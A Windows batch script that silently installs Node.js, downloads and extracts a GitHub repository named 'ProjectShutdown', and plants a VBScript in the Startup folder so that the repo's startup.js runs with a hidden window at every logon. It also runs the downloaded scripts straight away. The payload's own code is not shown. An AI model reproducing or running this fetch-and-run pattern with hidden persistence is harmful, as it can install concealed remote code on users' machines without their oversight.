@echo off
setlocal EnableDelayedExpansion

REM ==============================
REM Node.js configuration
REM ==============================

REM Change this if you want a newer LTS
set NODE_VERSION=18.19.0
set NODE_MSI_URL=https://nodejs.org/dist/v%NODE_VERSION%/node-v%NODE_VERSION%-x64.msi
set NODE_MSI=%TEMP%\node-v%NODE_VERSION%-x64.msi

REM ==============================
REM Check if Node.js is installed
REM ==============================

echo Checking for Node.js...

where node >nul 2>&1
if %ERRORLEVEL%==0 (
    echo Node.js is already installed.
    node -v
) else (
    echo Node.js not found. Installing Node.js %NODE_VERSION%...

    powershell -Command "Invoke-WebRequest -Uri '%NODE_MSI_URL%' -OutFile '%NODE_MSI%'"

    if not exist "%NODE_MSI%" (
        echo Failed to download Node.js installer.
        pause
        exit /b
    )

    echo Installing Node.js silently...
    msiexec /i "%NODE_MSI%" /quiet /norestart

    REM Refresh PATH for current session
    set "PATH=%PATH%;C:\Program Files\nodejs"

    echo Node.js installed successfully.
    node -v
)

REM ==============================
REM Variables
REM ==============================

set ZIP_URL=https://github.com/Siddarth-abcs/ProjectShutdown/archive/refs/heads/main.zip

REM Programs folder
set PROGRAMS=%APPDATA%\Microsoft\Windows\Start Menu\Programs

REM Startup folder
set TARGET_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

set ZIP_NAME=ProjectShutdown.zip
set EXTRACT_FOLDER=ProjectShutdown-main

REM ==============================
REM Download ZIP
REM ==============================

echo Downloading ProjectShutdown...

powershell -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%PROGRAMS%\%ZIP_NAME%'"

if not exist "%PROGRAMS%\%ZIP_NAME%" (
    echo Download failed.
    pause
    exit /b
)

echo Download successful.

REM ==============================
REM Extract ZIP
REM ==============================

echo Extracting ZIP...

powershell -Command "Expand-Archive -Force '%PROGRAMS%\%ZIP_NAME%' '%PROGRAMS%'"

if not exist "%PROGRAMS%\%EXTRACT_FOLDER%" (
    echo Extraction failed.
    pause
    exit /b
)

echo Extraction successful.

REM ==============================
REM Ensure Startup directory exists
REM ==============================

if not exist "%TARGET_DIR%" (
    mkdir "%TARGET_DIR%"
)

REM ==============================
REM Create start.vbs in Startup
REM ==============================

echo Creating start.vbs at:
echo %TARGET_DIR%

echo Set shell = CreateObject("WScript.Shell")> "%TARGET_DIR%\start.vbs"
echo shell.Run "node ""%PROGRAMS%\%EXTRACT_FOLDER%\startup.js""", 0, False>> "%TARGET_DIR%\start.vbs"

if exist "%TARGET_DIR%\start.vbs" (
    echo start.vbs created successfully.
) else (
    echo Failed to create start.vbs.
)

REM ==============================
REM Run existing node.vbs
REM ==============================

set NODE_VBS_PATH=%PROGRAMS%\%EXTRACT_FOLDER%\node.vbs

if exist "%NODE_VBS_PATH%" (
    echo Running node.vbs...
    cscript //nologo "%NODE_VBS_PATH%"
) else (
    echo node.vbs not found at %NODE_VBS_PATH%
)

REM ==============================
REM Run start.vbs from Startup folder
REM ==============================

set "NODE_VBS_PATH=%TARGET_DIR%\start.vbs"

if exist "%NODE_VBS_PATH%" (
    echo Running start.vbs...
    cscript //nologo "%NODE_VBS_PATH%"
) else (
    echo start.vbs not found at "%NODE_VBS_PATH%"
)

exit /b
